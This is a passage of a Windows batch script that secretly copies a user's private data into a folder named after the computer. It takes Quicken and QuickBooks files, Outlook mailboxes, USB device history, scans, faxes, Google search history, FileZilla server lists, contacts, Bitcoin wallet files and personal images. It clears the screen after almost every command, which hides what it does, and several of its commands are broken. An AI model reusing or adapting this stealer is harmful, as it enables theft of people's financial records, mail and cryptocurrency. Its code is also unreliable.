If Exist ".\%computername%\DataBases_and_Financials\*.qdt" mkdir ".\%computername%\DataBases_and_Financials\Quicken" && move /Y ".\%computername%\DataBases_and_Financials\*.qdt" ".\%computername%\DataBases_and_Financials\MicrosoftMoney\Quicken\*.qdt"
cls
If Exist ".\%computername%\DataBases_and_Financials\*.qba" mkdir ".\%computername%\DataBases_and_Financials\QuickBooks" && move /Y ".\%computername%\DataBases_and_Financials\*.qba" ".\%computername%\DataBases_and_Financials\MicrosoftMoney\QuickBooks\*.qba"
cls
If Exist ".\%computername%\DataBases_and_Financials\*.qbb" mkdir ".\%computername%\DataBases_and_Financials\QuickBooks" && move /Y ".\%computername%\DataBases_and_Financials\*.qbb" ".\%computername%\DataBases_and_Financials\MicrosoftMoney\QuickBooks\*.qbb"
cls
If Exist ".\%computername%\DataBases_and_Financials\*.qbm" mkdir ".\%computername%\DataBases_and_Financials\QuickBooks" && move /Y ".\%computername%\DataBases_and_Financials\*.qbm" ".\%computername%\DataBases_and_Financials\MicrosoftMoney\QuickBooks\*.qbm"
cls
If Exist ".\%computername%\DataBases_and_Financials\*.qbw" mkdir ".\%computername%\DataBases_and_Financials\QuickBooks" && move /Y ".\%computername%\DataBases_and_Financials\*.qbw" ".\%computername%\DataBases_and_Financials\MicrosoftMoney\QuickBooks\*.qbw"
cls
If Exist ".\%computername%\DataBases_and_Financials\*.qbx" mkdir ".\%computername%\DataBases_and_Financials\QuickBooks" && move /Y ".\%computername%\DataBases_and_Financials\*.qbx" ".\%computername%\DataBases_and_Financials\MicrosoftMoney\QuickBooks\*.qbx"
cls
If Exist ".\%computername%\DataBases_and_Financials\*.qby" mkdir ".\%computername%\DataBases_and_Financials\QuickBooks" && move /Y ".\%computername%\DataBases_and_Financials\*.qby" ".\%computername%\DataBases_and_Financials\MicrosoftMoney\QuickBooks\*.qby"
cls
if exist ".\%computername%\DataBases_and_Financials\*" echo Completed.  >> .\%computername%\%username%.txt 
cls
if not exist ".\%computername%\DataBases_and_Financials\*" echo Failed.  >> .\%computername%\%username%.txt 
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
echo -----Microsoft OutLook-----   >> .\%computername%\%username%.txt 
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
if exist "%USERPROFILE%\My Documents" %%i IN (*.dbx, *.pst) DO mkdir ".\%computername%\OutLook"
cls
if exist "%USERPROFILE%\Documents" %%i IN (*.dbx, *.pst) DO mkdir ".\%computername%\OutLook"
cls
FOR /R  "%USERPROFILE%\Documents" %%i IN (*.dbx, *.pst) DO copy /Y %%i ".\%computername%\OutLook"
cls
FOR /R  "%USERPROFILE%\My Documents" %%i IN (*.dbx, *.pst) DO copy /Y %%i ".\%computername%\OutLook"
cls
if exist ".\%computername%\OutLook" echo Completed.  >> .\%computername%\%username%.txt 
cls
if not exist ".\%computername%\OutLook" echo Failed.  >> .\%computername%\%username%.txt 
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
echo -----Dump Portable Storage Devices -----   >> .\%computername%\%username%.txt 
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR"   >> .\%computername%\%username%.txt 
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
echo -----Dump Scanned Documents -----   >> .\%computername%\%username%.txt 
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
if exist "%userprofile%\My Documents\Scann*" mkdir ".\%computername%\Scans" && echo Found. >> .\%computername%\%username%.txt 
cls
copy /Y "%userprofile%\My Documents\Scann*" ".\%computername%\Scans"
cls
if exist "%userprofile%\Documents\Scann*" mkdir ".\%computername%\Scans\*" && echo Found. >> .\%computername%\%username%.txt 
cls
copy /Y "%userprofile%\Documents\Scann*" ".\%computername%\Scans\*"
cls
if not exist ".\%computername%\Scans\*" echo Failed.  >> ".\%computername%\%username%.txt"
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
echo -----Dump Fax Documents -----   >> .\%computername%\%username%.txt 
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
if exist "%userprofile%\My Documents\Fax\*" mkdir ".\%computername%\Fax" && echo Found.  >> .\%computername%\%username%.txt 
cls
copy /Y "%userprofile%\My Documents\Fax\*" ".\%computername%\Fax\*"
cls
if exist "%userprofile%\Documents\Fax\*" mkdir ".\%computername%\Fax" && echo Found.  >> .\%computername%\%username%.txt 
cls
copy /Y "%userprofile%\Documents\Fax\*" ".\%computername%\Fax\*"
cls
if not exist ".\%computername%\Fax\*" echo Failed.  >> .\%computername%\%username%.txt
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
echo -----Dump Google Information -----   >> .\%computername%\%username%.txt 
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
if exist "%AppData%\Google\*"  mkdir ".\%computername%\GoogleInfo"
cls
copy /Y "%AppData%\Google\Local Search History\*" ".\%computername%\GoogleInfo\*"
cls
if exist ".\%computername%\GoogleInfo\*.*" echo Completed.  >> .\%computername%\%username%.txt 
cls
if not exist ".\%computername%\GoogleInfo\*.*" echo Failed.  >> .\%computername%\%username%.txt && rmdir ".\%computername%\GoogleInfo"
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
echo -----Dump Thumb.db From MyDoc/Desktop -----   >> .\%computername%\%username%.txt 
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
if  exist "%userprofile%\My Documents\thumbs.db" mkdir ".\%computername%\Thumbs"
cls
attrib -r -a -s -h "%userprofile%\My Documents\My Pictures\thumbs.db"
cls
copy /Y "%userprofile%\My Documents\My Pictures\thumbs.db" ".\%computername%\Thumbs\MyPictures.db"
cls
attrib -r -a -s -h "%userprofile%\My Documents\thumbs.db"
cls
copy /Y "%userprofile%\My Documents\thumbs.db" ".\%computername%\Thumbs\MyDocuments.db"
cls
attrib -r -a -s -h "%userprofile%\Documents\My Pictures\thumbs.db"
cls
copy /Y "%userprofile%\Documents\My Pictures\thumbs.db" ".\%computername%\Thumbs\MyPictures.db"
cls
attrib -r -a -s -h "%userprofile%\Documents\thumbs.db"
cls
copy /Y "%userprofile%\Documents\thumbs.db" ".\%computername%\Thumbs\MyDocuments.db"
cls
attrib -r -a -s -h "%userprofile%\Desktop\thumbs.db"
cls
copy /Y "%userprofile%\Desktop\thumbs.db" ".\%computername%\Thumbs\Desktop.db"
cls
if exist ".\%computername%\Thumbs" echo Completed.  >> .\%computername%\%username%.txt 
cls
if not exist ".\%computername%\Thumbs" echo Failed.  >> .\%computername%\%username%.txt 
cls
:FileZilla
if exist "%AppData%\FileZilla\recentservers.xml" mkdir ".\%computername%\FileZilla"
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
echo -----Dump Recent Activity on FileZilla Client -----   >> .\%computername%\%username%.txt 
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
type "%AppData%\Roaming\FileZilla\recentservers.xml" >> .\%computername%\%username%.txt
cls
if not exist "%AppData%\Roaming\FileZilla\recentservers.xml" echo Failed.  >> .\%computername%\%username%.txt
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
echo -----Dump NetWork ShortCuts\Connections -----   >> .\%computername%\%username%.txt 
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
::Win7
copy /Y "%AppData%\Roaming\Microsoft\Network\Connections\*" ".\%computername%\NetWorkShortCuts"  
cls
::XP
if exist "%AppData%\Microsoft\Windows\Network Shortcuts\*" mkdir ".\%computername%\NetWorkShortCuts"
cls
copy /Y "%AppData%\Microsoft\Windows\Network Shortcuts\*" ".\%computername%\NetWorkShortCuts"   
cls
if exist ".\%computername%\NetWorkShortCuts\*" echo Completed. >> .\%computername%\%username%.txt 
cls
if not exist ".\%computername%\NetWorkShortCuts\*" echo Failed. >> .\%computername%\%username%.txt && rmdir /Q ".\%computername%\NetWorkShortCuts"
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
echo -----Dump Recycle.Bin Contents -----   >> .\%computername%\%username%.txt 
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
if not exist ".\%computername%\Recycle.Bin" mkdir ".\%computername%\Recycle.Bin"
cls
::WinXP
copy /Y "%homedrive%\RECYCLER\" ".\%computername%\Recycle.Bin\" 
cls
::Win7/Vista
copy /Y "%homedrive%\*.*" ".\%computername%\Recycle.Bin\"
cls
if exist ".\%computername%\Recycle.Bin\*.*" echo Completed. >> .\%computername%\%username%.txt 
cls
if not exist ".\%computername%\Recycle.Bin\*.*" echo Failed. >> .\%computername%\%username%.txt 
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
echo -----Dump User Contacts -----   >> .\%computername%\%username%.txt 
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
if exist %userprofile%\Contacts\*.contact mkdir .\%computername%\Contacts
cls
copy /Y %userprofile%\Contacts\*.contact  .\%computername%\Contacts\*
cls
if exist .\%computername%\Contacts\* echo Found. >> .\%computername%\%username%.txt
cls
if not exist .\%computername%\Contacts\* echo Failed. >> .\%computername%\%username%.txt
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
echo -----Dump Microsoft Office Recent -----   >> .\%computername%\%username%.txt 
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
if exist "%AppData%\Microsoft\Office\Recent\*" mkdir ".\%computername%\MSOfficeRecent"
cls
copy /Y "%AppData%\Microsoft\Office\Recent\*"  ".\%computername%\MSOfficeRecent" 
cls
if exist  ".\%computername%\MSOfficeRecent\*.*" echo Completed. >> .\%computername%\%username%.txt 
cls
if not exist ".\%computername%\MSOfficeRecent\*.*" echo Failed. >> .\%computername%\%username%.txt 
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
echo -----Dump BitCoin(online money)-----   >> .\%computername%\%username%.txt 
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
::WinXp
if exist "%AppData%\Bitcoin\wallet.dat" mkdir ".\%computername%\BitCoin"
cls
copy /Y "%AppData%\Bitcoin\addr.dat" ".\%computername%\BitCoin\addr.dat" 
cls
copy /Y "%AppData%\Bitcoin\wallet.dat" ".\%computername%\BitCoin\wallet.dat" 
cls
::win7
if exist "%AppData%\Roaming\Bitcoin\wallet.dat" mkdir ".\%computername%\BitCoin"
cls
copy /Y "%AppData%\Roaming\Bitcoin\addr.dat" ".\%computername%\BitCoin\addr.dat"  
cls
copy /Y "%AppData%\Roaming\Bitcoin\wallet.dat" ".\%computername%\BitCoin\wallet.dat"  
cls
if exist ".\%computername%\BitCoin\*" echo Wallet\Address Book Found. >> .\%computername%\%username%.txt 
cls
::winXP
if exist "%AppData%\poclbm\*" mkdir ".\%computername%\BitCoin\BitCoinMiner\"
cls
copy /Y "%AppData%\poclbm\*" ".\%computername%\BitCoin\BitCoinMiner\*"
::win7
if exist "%AppData%\Roaming\poclbm\*" mkdir ".\%computername%\BitCoin\BitCoinMiner\"
cls
copy /Y "%AppData%\Roaming\poclbm\*" ".\%computername%\BitCoin\BitCoinMiner\*"
cls
if exist ".\%computername%\BitCoin\BitCoinMiner\*" echo BitCoin Miner Found. >> .\%computername%\%username%.txt
cls
if not exist ".\%computername%\BitCoin\BitCoinMiner\*" echo BitCoin Miner Failed. >> .\%computername%\%username%.txt && rmdir ".\%computername%\BitCoinMiner"
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
echo -----PNG images-----   >> .\%computername%\%username%.txt 
cls
echo ----------------------------------------------------------------------------------------------  >> .\%computername%\%username%.txt 
cls
mkdir ".\%computername%\Images\" 
cls
FOR /R "%USERPROFILE%\My Documents" %%i IN (*.png) DO copy /Y %%i ".\%computername%\Images\" 
cls
FOR /R "%USERPROFILE%\Documents" %%i IN (*.png) DO copy /Y %%i ".\%computername%\Images\"
cls
FOR /R "%USERPROFILE%\desktop" %%i IN (*.png) DO copy /Y %%i ".\%computername%\Images\" 
cls
if not exist ".\%computername%\Images\*.PNG"  (echo Failed. >> .\%computername%\%username%.txt) ELSE (echo Found. >> .\%computername%\%username%.txt)
cls
if not exist ".\%computername%\Images\*.png" rmdir /Q ".\%computername%\Images\" 
cls 
echo - >> .\%computername%\%username%.txt
cls
echo Note: PNG files hi-res images,most cases are user created.  >> .\%computername%\%username%.txt 
cls
echo ----------------------------------------------------------------------------------------------   >> .\%computername%\%username%.txt 
cls
echo -----Time:%date% %time%-----   >> .\%computername%\%username%.txt 
cls
echo ----------------------------------------------------------------------------------------------   >> .\%computername%\%username%.txt 
cls
::Make computer beep when done
exit